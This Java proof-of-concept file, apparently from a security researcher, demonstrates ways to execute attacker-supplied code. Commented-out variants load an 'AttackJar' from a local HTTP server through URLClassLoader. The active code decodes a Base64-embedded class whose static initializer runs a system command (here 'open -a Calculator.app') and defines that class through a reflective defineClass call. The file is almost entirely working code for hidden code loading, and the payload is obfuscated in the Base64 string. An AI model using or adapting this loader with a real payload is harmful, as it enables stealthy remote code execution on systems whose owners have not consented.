package org.example;

import java.lang.reflect.Method;
import java.util.Base64;

/**
 * @author Whoopsunix
 */
public class Run {
    public static void main(String[] args) throws Exception {
        /**
         * 调用 static
         */
//        URL url = new URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
//        Object object = loadedClass.newInstance();

//        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/");
//        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
//        Object object = loadedClass.getConstructor(null).newInstance(null);

        /**
         * 调用构造方法
         */
//        java.net.URL url = new java.net.URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
//        // public
////        Object object = loadedClass.getConstructor(String.class).newInstance("open -a Calculator.app");
//        // private
//        Class cls = String.class;
//        java.lang.reflect.Constructor constructor = loadedClass.getDeclaredConstructor(cls);
//        constructor.setAccessible(true);
//        Object object = constructor.newInstance("open -a Calculator.app");

        /**
         * 调用方法
         */
//        URL url = new URL("http://127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
//        Object object = loadedClass.newInstance();
//        loadedClass.getMethod("exec", String.class).invoke(object, "open -a Calculator.app");


        /**
         * Base64解密后加载
         */
        // generate
//        String b64Str = new B64().encodeJavaClass(Exec.class);

        String b64Str = "yv66vgAAADQAIgoABwAVCgAWABcIABgKABYAGQcAGgcAGwcAHAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL0V4ZWM7AQANU3RhY2tNYXBUYWJsZQcAGwcAGgEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwACAAJBwAdDAAeAB8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAgACEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQb3JnL2V4YW1wbGUvRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAACAAEACAAJAAEACgAAAGoAAgACAAAAEiq3AAG4AAISA7YABFenAARMsQABAAQADQAQAAUAAwALAAAAFgAFAAAABwAEAAkADQALABAACgARAAwADAAAAAwAAQAAABIADQAOAAAADwAAABAAAv8AEAABBwAQAAEHABEAAAgAEgAJAAEACgAAAE8AAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQADAAsAAAASAAQAAAAQAAkAEgAMABEADQATAAwAAAACAAAADwAAAAcAAkwHABEAAAEAEwAAAAIAFA==";

        byte[] bytes = Base64.getDecoder().decode(b64Str);
//        ClassLoader classLoader = this.getClass().getClassLoader();
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        Class<?> loadedClass = (Class<?>) defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
        loadedClass.newInstance();
    }
}
